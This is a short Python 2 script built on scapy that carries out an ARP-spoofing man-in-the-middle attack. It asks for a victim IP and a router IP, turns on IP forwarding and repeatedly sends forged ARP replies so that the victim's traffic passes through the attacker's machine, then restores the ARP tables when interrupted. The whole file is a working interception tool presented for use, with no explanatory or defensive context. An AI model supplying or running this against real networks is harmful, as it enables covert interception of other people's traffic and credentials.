'''
2015
imrx@protonmail.com
'''

from scapy.all import *
import sys
import os
from time import sleep

try:
	interface = raw_input("[*] Enter NETWORK INTERFACE: ")
	victimIP = raw_input("[*] Enter victim IP: ")
	gateIP = raw_input("[*] Enter your router IP: ")

except KeyboardInterrupt:
	print "\n[*] SHUTDOWN REQUESTED!"
	print "[*] Exiting..."
	sys.exit(1)

print "\n[*] Enabling IP forwarding...\n"
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def get_mac(IP):
	conf.verb = 0
	ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)
	for snd, rcv in ans:
		return rcv.sprintf(r"%Ether.src%")

def reARP():
    print "\n[*] Restoring targets..."
    victimMAC = get_mac(victimIP)
    gateMAC = get_mac(gateIP)
    send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count = 7)
    send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateMAC), count = 7)
    print "[*] Disabling IP forwarding..."
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print "[*] Shutting down..."
    sys.exit(1)
 
def trick(gm, vm):
    send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst = vm))
    send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst = gm))

def mitm():
    try:
        victimMAC = get_mac(victimIP)
    except Exception:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print "[!] Couldn't find gateway MAC!!!"
        print "[!] Exiting..."
        sys.exit(1)
    try:
        gateMAC = get_mac(gateIP)
    except Exception:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print "[!] Couldn't find gateway MAC!!!"
        print "[!] Exiting..."
        sys.exit(1)
    print "[*] Poisoning targets..."
    while 1:
        try:
            trick(gateMAC, victimMAC)
            sleep(2)
        except KeyboardInterrupt:
            reARP()
            break
mitm()
